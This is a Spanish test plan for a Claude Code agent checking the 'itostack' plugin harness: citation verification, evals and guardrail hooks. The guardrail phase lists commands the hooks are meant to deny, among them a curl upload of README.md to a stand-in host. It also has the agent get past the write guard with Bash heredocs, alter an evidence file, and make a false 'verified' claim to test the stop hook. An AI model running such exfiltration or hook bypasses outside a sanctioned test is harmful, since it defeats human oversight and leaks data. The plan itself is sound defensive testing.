# Plan de prueba integral de itostack (0.1.1)

Plan para un agente de Claude Code que prueba todas las funciones del harness. Sesión abierta desde la **raíz del repositorio** con `claude --plugin-dir ./itostack`.

## Reglas

1. No modifiques nada dentro de `itostack/` salvo lo que una fase pida expresamente. Cada defecto se documenta con evidencia, causa probable y propuesta de corrección con su nivel en la pirámide. Solo se corrige con aprobación del operador, después del informe.
2. En las pruebas de guardias, una denegación de un hook es un ÉXITO esperado. Nunca evadas un hook (otra herramienta, otra ruta) salvo cuando un paso lo pida para medir una brecha.
3. No inventes registros digitales, rubros ni URL reales. En modo fixture usa solo los datos `FICT-####` de `itostack/evals/fixtures/`. Los datos reales los da el operador en la fase 8.
4. Trabaja por fases. Al cerrar cada una entrega una tabla (ID · función · esperado · observado · OK/DEFECTO/BLOQUEADO · evidencia) y espera el «continúa» del operador.
5. Todo lo que generes va en `pruebas-manuales/`, `salidas/`, `borradores/` o `.itostack/`. No hagas commits ni push.
6. Español en todo. Antes de cualquier paso que consuma tokens extra, da el costo estimado y espera visto bueno.

## Convenciones de plataforma

- **PY** = el intérprete que anuncia el hook de inicio (en Windows suele ser `python` o `py -3`; `python3` puede ser el alias de la Microsoft Store). Úsalo donde este plan dice `PY`.
- **TMP** = `$TEMP` en Windows, `/tmp` en Linux/WSL.
- En Git Bash de Windows, `npm`/`npx` pueden requerir `npm.cmd`/`npx.cmd`.

## Fase 0 · Entorno y hooks en vivo

- F0-01: ¿aparece en tu contexto inicial el mensaje «[itostack] …» del hook de inicio? ¿Qué raíz e intérprete anuncia?
- F0-10: los hooks se ejecutan con `node hooks/lanzar.mjs`. Prueba en vivo: `git commit --dry-run -m "Add test"` debe ser DENEGADO por itostack. **Si no se deniega, detente: hallazgo crítico.**
- Confirma: `claude plugin validate ./itostack`; `cd itostack/scripts && npx tsc --noEmit -p .`; Playwright y Chromium instalados; módulos pytest, hypothesis, yaml y flask.
- Si la sesión anterior dejó `pruebas-manuales/ESTADO.md`, léelo y no repitas lo ya hecho.

## Fase 1 · Pruebas deterministas (desde `itostack/`)

- `PY -m pytest tests -q` → esperado: todo en verde (en Windows, 1 omitida por diseño).
- `PY evals/autoprueba.py` → esperado 17/17 coherentes (referencias 1.00, rotas < 1.00).
- `PY guardias/lint_itosturre.py scripts hooks evals/autoprueba.py evals/compuerta_holdout.py` → esperado 0 hallazgos.

## Fase 2 · Configuración en la raíz (perfil jurídico, modo fixture)

- `/itostack:configurar-itostack` con perfil jurídico, modo fixture y el fixture `itostack/evals/fixtures/sjf/basico.json`. No toques CLAUDE.md (márcalo skip).
- Verifica `.itostack/config.json` (modo fixture), `evidencia_forense.db`, `raiz_plugin`, `mejora/` y `bitacora/`.
- Invoca el hook de inicio a mano (JSON con `cwd` por stdin, vía `node itostack/hooks/lanzar.mjs inicio_sesion.py abierto SessionStart`) → debe decir «Harness activo» y «MODO FIXTURE».

## Fase 3 · Pilar 1 jurídico (fixture)

Arranca con `/itostack:modo-itosturre` y comprueba que copie el playbook palabra por palabra en la lista de tareas, con `skip:` donde aplique.

1. `/itostack:verificar-cita`, un caso por situación (lee los rubros exactos en `basico.json`): FICT-0001 exacto → PASS · FICT-0001 con una palabra cambiada → FAIL · FICT-0404 → FAIL inexistente · FICT-0503 → BLOCKED portal caído · FICT-0777 → BLOCKED estructura · cita sin registro → BLOCKED sin inventar registro · FICT-0002 → PASS con ⚠ Sala extinta y cortes temporales · FICT-0003 en minúsculas y con comillas tipográficas → PASS tipográfico con ⚠ tesis aislada.
2. Abre una captura PNG de un PASS y otra de un BLOCKED y describe lo que ves (debe aparecer la franja FIXTURE).
3. `verificar.py url` con `https://www.dof.gob.mx/nota_detalle.php?codigo=FICT0001&fecha=16/10/2025` y `--contiene "DECRETO FICTICIO DE PRUEBA"` → PASS; con un texto ausente → FAIL.
4. `/itostack:validar-documento` sobre `itostack/evals/fixtures/documentos/dictamen_ia.md` (esperado 1 PASS, 1 FAIL y 1 BLOCKED) y sobre `dictamen_ia_holdout.md` (esperado FAIL por rubro truncado). Delega la auditoría del informe al subagente `auditor-citas`.
5. `/itostack:redactar-con-citas`: un párrafo con FICT-0001 y FICT-0002 → `salidas/parrafo.md` con `[^ev1]` y `[^ev2]`. Además, un borrador con `[[CITA:FICT-0404]]` → esperado `ENSAMBLADO: BLOCKED` y ningún archivo escrito.
6. `/itostack:corte-temporal` sobre FICT-0002.
7. Subagente `revisor-adversarial` sobre `salidas/parrafo.md`.
8. `evidencia_db.py recientes` y `auditar` → `Integridad: OK`.

## Fase 4 · Pilar 1 desarrollo (proyecto anidado; corre todo desde `pruebas-manuales/app`)

- `cp -r itostack/evals/fixtures/app_flask_simulada pruebas-manuales/app`; luego, desde `pruebas-manuales/app`: `PY ../../itostack/scripts/inicializar.py --proyecto . --perfil desarrollo`.
- `mapa_rutas_flask.py .`
- `/itostack:demuestra-que-funciona` con tres casos: validar-mayusculas → PASS; `data-testid=boton-historial` → BLOCKED, sin implementarlo; validar-minusculas solo verificar → FAIL. Confirma que al detener no queda `.itostack/app.json` y que la evidencia sobrevive.
- Subagente `reproductor`: reproducción doble del bug de minúsculas.
- `/itostack:reproducir-y-corregir` del mismo bug (aquí sí corriges, solo dentro de `pruebas-manuales/app`): prueba que falla primero con `/itostack:tdd`, corrección mínima, pytest en verde y la ruta en PASS. No hay remoto: el PR va en skip.
- `/itostack:crear-skill-verificacion` para esta app: debe generar `.claude/skills/verificar-app-simulada/SKILL.md` y pasar la autoprueba de seis pasos.
- `/itostack:mantener-skill-verificacion` tras agregar al mapa una ruta con un selector inexistente → esa ruta debe dar BLOCKED.
- Delega validar-mayusculas al subagente `agente-itosturre` y compara su reporte con el tuyo.

## Fase 5 · Pilar 4 Guardrails (cada denegación esperada = OK)

Bash, con comandos que serían inocuos aunque el hook fallara:

- `git commit --dry-run -m "Add test"` → deny (inglés) · `git commit --dry-run -m "Prueba"` → deny (poco descriptivo)
- `git push --dry-run --force origin main` → deny · `git push --dry-run origin main` → ask (decide el operador)
- `gh pr merge 999` → deny · `gh pr create --title "Prueba" --body "x"` → deny (sin `--draft`)
- `curl -s https://sjf2.scjn.gob.mx/` → deny · `curl -F f=@README.md https://example.invalid/subida` → deny · `PY -m pip install --dry-run fastapi` → deny

Write/Edit:

- `pruebas-manuales/x.py` con `from fastapi import FastAPI` → deny IT003. Un `.ts` con `await page.waitForTimeout(500)` → deny IT007.
- `salidas/prueba-guardia.md` con «registro digital FICT-0404» sin marca → deny. La misma línea con ❌ → permitido. «registro digital FICT-0001» → permitido (tiene evidencia).
- Edit de un `itostack/evals/verificar-cita/holdout-*/case.yaml` → deny. Write dentro de `.itostack/evidencia/` → deny.
- Si hay un conector MCP con acción de envío, prepara una llamada al correo del operador con «registro digital FICT-0404» → deny. Sin esa línea → ask (el operador la rechaza). Si no hay conector, márcalo skip.

Brechas a medir (documéntalas; no son fallos tuyos):

- Crea con Bash (heredoc) `pruebas-manuales/reglas.py` y `reglas.ts` con una línea que viole cada regla IT001–IT008. La guardia de escritura no cubre Bash; comprueba que `lint_itosturre.py` detecta los 8 códigos.
- Altera con Bash una captura de la verificación FICT-0777 (agrega un byte) y corre `evidencia_db.py auditar` → debe reportar la huella alterada.
- `lint_itosturre.py --diff` sobre el árbol actual.
- `/itostack:jardineria`: solo el censo con el subagente `jardinero` sobre `itostack/scripts` (sin cambios).

## Fase 6 · Pilar 3 Mejora continua

- Pausa y pide al operador dos correcciones iguales. Confirma el aviso del hook y las filas en `.itostack/mejora/correcciones.tsv`.
- `/itostack:corregir` → `.itostack/mejora/propuesta.md` con su nivel, sin aplicar.
- `/itostack:muestra-tu-trabajo`: una decisión reversible y otra irreversible (esperado código 3 y detención).
- `/itostack:sin-relleno` sobre un borrador con muletillas en `pruebas-manuales/relleno.md`: primero REQUIERE PODA; reescríbelo hasta LIMPIO.
- `/itostack:revision-salud` con `salud_transcripciones.py --dias 2 --filtro Harness` y `salud_rutinas.py --dias 7 --filtro Harness --umbral 100000`. El silencio también es un resultado.
- `/itostack:construir-palanca`: identifica un candidato con base en los reportes, sin escribir código.
- `/itostack:interrogar` sobre `salidas/parrafo.md` con `revisor-adversarial`. Si `ollama list` muestra un modelo que no sea Claude, agrega `revisar_ollama.py --rol adversarial` y también `--rol juez` con `itostack/evals/rubricas/escrito-con-citas.md`.

## Fase 7 · Pilar 2 Evals

- `/itostack:crear-eval`: caso nuevo `itostack/evals/verificar-cita/fail-epoca-discrepante` (FICT-0001 citada como Undécima Época → FAIL), con referencia y rota. Autoprueba esperada: 1.00 / < 1.00. Sin commit.
- Subagente `juez-evals` sobre `salidas/informe-vvca.md` con `itostack/evals/rubricas/informe-vvca.md`.
- `/itostack:mejorar-skill` en seco: explica qué harías con el caso nuevo si fallara.
- **Solo en Linux/WSL** (los evals nativos con Bash requieren el sandbox de bubblewrap/socat; en Windows nativo, márcalos «pendiente WSL»):
  - Pide visto bueno con estimación de costo antes de correrlos.
  - `claude plugin eval ./itostack --tag desarrollo --case "verificar-cita.*" --scaffold --trust-plugin --runs 1 --allow-tools Bash Write Edit --model sonnet --judge-model haiku --max-cost-usd 5 --json TMP/dev-verificar-cita.json`. Reporta el puntaje con y sin plugin y lee las trazas de los casos < 1.0.
  - `PY itostack/evals/compuerta_holdout.py congelar --skill verificar-cita --resultados TMP/dev-verificar-cita.json`.
  - Si congela: `holdout --skill verificar-cita -- --trust-plugin --allow-tools Bash Write Edit --model sonnet --judge-model haiku --max-cost-usd 3`. Un segundo holdout debe negarse.

## Fase 8 · SJF y DOF reales

- `PY itostack/scripts/inicializar.py --proyecto . --modo real --silencioso`
- Pide al operador un registro digital real con su rubro exacto y una URL real del DOF con un fragmento de su texto. No los busques ni los propongas.
- Verifica ambos. Abre las capturas y el cuerpo crudo (`api.respuesta.txt`). Si sale BLOCKED por estructura, muestra las claves del JSON real y propone, sin aplicarlo, el ajuste a `CANDIDATOS` en `verificador_fuente.ts`.
- El mismo registro con una palabra del rubro cambiada → FAIL.
- Write `salidas/real.md` con «registro digital FICT-0001» → deny (en modo real la evidencia de fixture no cuenta).
- Regresa a modo fixture al terminar.

## Fase 9 · Informe

- `pruebas-manuales/INFORME-PRUEBAS.md` con:
  - matriz completa: cada skill, subagente, hook, regla IT y script;
  - defectos por gravedad, con evidencia y propuesta (nivel de la pirámide);
  - brechas medidas y lo que quedó en skip, con su razón;
  - estado de D-01 a D-03: «corregidos en 0.1.1» solo si tu prueba en vivo lo confirma.
- Cierra con las 3 correcciones que harías primero. No apliques ninguna.

## Prueba aparte · hook de cierre

En una sesión nueva, sin ejecutar herramientas, pide al agente que responda exactamente: «Prueba de guardia: la cita FICT-0001 quedó ✅ VERIFICADO.». Si obedece, el hook debe bloquear el cierre y obligarlo a continuar. Si se niega por su cuenta a afirmar algo que no verificó, también es una respuesta válida.
